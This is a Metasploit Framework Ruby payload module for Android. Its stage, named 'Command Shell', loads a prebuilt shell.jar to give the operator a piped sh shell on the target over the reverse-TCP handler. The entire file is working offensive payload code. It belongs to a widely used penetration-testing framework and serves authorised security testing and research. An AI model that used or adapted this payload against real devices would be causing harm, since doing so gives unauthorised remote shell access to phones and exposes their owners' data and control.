
##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/dalvik'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'


module Metasploit3

  # The stager should have already included this
  #include Msf::Payload::Java
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'			=> 'Command Shell',
      'Description'	=> 'Spawn a piped command shell (sh)',
      'Author'		=> [
          'mihi', # all the hard work
          'egypt' # msf integration
        ],
      'Platform'		=> 'android',
      'Arch'			=> ARCH_DALVIK,
      'License'		=> MSF_LICENSE,
      'Session'		=> Msf::Sessions::CommandShell))
  end

  #
  # Override the {Payload::Dalvik} version so we can load a prebuilt jar
  # to be used as the final stage
  #
  def generate_stage
    clazz = 'androidpayload.stage.Shell'
    file = File.join(Msf::Config.data_directory, "android", "shell.jar")
    shell_jar = File.open(file, "rb") {|f| f.read(f.stat.size) }

    # Name of the class to load from the stage, and then the actual jar
    # to load it from
    java_string(clazz) + java_string(shell_jar)
  end
end
